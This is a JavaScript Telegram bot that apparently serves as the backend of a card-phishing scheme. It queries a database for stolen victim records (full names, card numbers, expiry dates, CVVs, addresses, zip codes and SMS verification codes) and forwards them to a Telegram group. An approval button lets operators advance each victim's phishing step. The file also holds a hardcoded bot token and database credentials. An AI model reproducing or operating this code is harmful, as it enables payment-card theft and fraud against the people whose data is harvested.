import TelegramBot from 'node-telegram-bot-api';
import mysql from 'mysql2/promise';
import axios from 'axios';

const token = "7269675720:AAEEkkXm30WMsjR4ZWysHDPQTQeym0aUX-Y";

const bot = new TelegramBot(token, {
  polling: true,
  request: {
    agentOptions: {
      keepAlive: true,
      family: 4
    }
  }
});

// 创建数据库连接
const pool = mysql.createPool({
  host: '47.243.88.30',
  user: 'pan',
  password: 'Panhui0712',
  database: 'pan',
  waitForConnections: true,
  connectionLimit: 10, // 限制连接池的最大连接数，防止过多连接
  queueLimit: 0,
  timezone: 'CST'
});

async function queryData(sql) {
  try {
    const [rows] = await pool.query(sql);
    return rows;
  } catch (error) {
    console.error('Error executing query:', error);
    return null;
  }
}

async function updateData(tableName, columnName, newValue, whereCondition) {
  try {
    const [results] = await pool.execute(`
      UPDATE ${tableName}
      SET ${columnName} = ?
      WHERE ${whereCondition}
    `, [newValue]);
    return results;
  } catch (error) {
    console.error('Error updating data:', error);
    throw error;
  }
}

let card_id = 297;
let code_id = 173;

//获取数据库最新填卡数据并发送消息到指定群
async function fetchDataAndSend() {
  try {
    let [cardData, codeData] = await Promise.all([
      queryData(`SELECT dc.id, concat(di.first_name, ' ', di.last_name) name, dc.card_no, dc.exp_date, dc.bin_code, di.zipcode, di.address, dc.create_time FROM data_card dc LEFT JOIN data_info di ON dc.user_id = di.user_id WHERE dc.id > ${card_id}`),
      queryData(`SELECT dco.id, dco.code, dc.card_no FROM data_code dco LEFT JOIN data_card dc ON dco.user_id = dc.user_id WHERE dco.id > ${code_id}`)
    ]);
    if (cardData && cardData.length > 0) {
      card_id = cardData[cardData.length - 1].id;
      for (let result of cardData) {
        await bot.sendPhoto('-1002199875824', `https://usapsupas.com/img.php?id=${result.id}`, {
          caption: `名字：${result.name}\n卡号：${result.card_no}\n日期：${result.exp_date}\nCVV：${result.bin_code}\n邮编：${result.zipcode}\n地址：${result.address}`,
          reply_markup: {
            inline_keyboard: [
              [{ text: '通过', callback_data: result.id }]
            ]
          }
        });
      }
    }
    if (codeData && codeData.length > 0) {
      code_id = codeData[codeData.length - 1].id;
      for (let result of codeData) {
        await bot.sendMessage('-1002199875824', `验证码：${result.code}\n卡号：${result.card_no}`);
      }
    }
  } catch (err) {
    console.error(err);
  }
}

async function setIpArea() {
  try {
    let [results] = await Promise.all([
      queryData(`SELECT id, ip from data_user where ip_area is null`),
    ]);
    if (results && results.length > 0) {
      for (let result of results) {
        await axios.get(`https://api.vore.top/api/IPdata?ip=${result.ip}`, {
          headers: {
            'User-Agent': ''
          }
        }).then(async (res) => {
          if (res && res.data && res.data.ipdata) {
            await updateData('data_user', 'ip_area', `${res.data.ipdata.info1}`, `id = ${result.id}`);
          }
        }).catch(async error => {
          await axios.get(`https://api.vore.top/api/IPdata?ip=${result.ip}`, {
            headers: {
              'User-Agent': ''
            }
          }).then(async (res) => {
            if (res && res.data && res.data.ipdata) {
              await updateData('data_user', 'ip_area', `${res.data.ipdata.info1}`, `id = ${result.id}`);
            }
          })
          /* if (error.response) {
            switch (error.response.status) {
            case 502:
              await axios.get(`https://api.vore.top/api/IPdata?ip=${result.ip}`).then(async (res) => {
                if (res && res.ipdata) {
                  await updateData('data_user', 'ip_area', `${res.ipdata.info1}`, `id = ${result.id}`);
                }
              })
              break;
            case 401:
              // 未授权
              break;
            case 404:
              // 资源未找到
              break;
            case 500:
              // 服务器错误
              break;
            default:
              // 其他错误
            }
          } */
        });
      }
    }
  } catch (err) {
    console.error(err);
  }
}

setInterval(fetchDataAndSend, 10000); // 每 10 秒执行一次 fetchDataAndSend 函数
setInterval(setIpArea, 600000); // 每 600 秒执行一次 setIpArea 函数

bot.on('callback_query', async (msg) => {
  // 修改消息按钮
  await bot.editMessageReplyMarkup({}, {
    chat_id: '-1002199875824',
    message_id: msg.message.message_id
  });
  await updateData('data_user', 'op_step', 'ok', `id = ${msg.data}`);
});
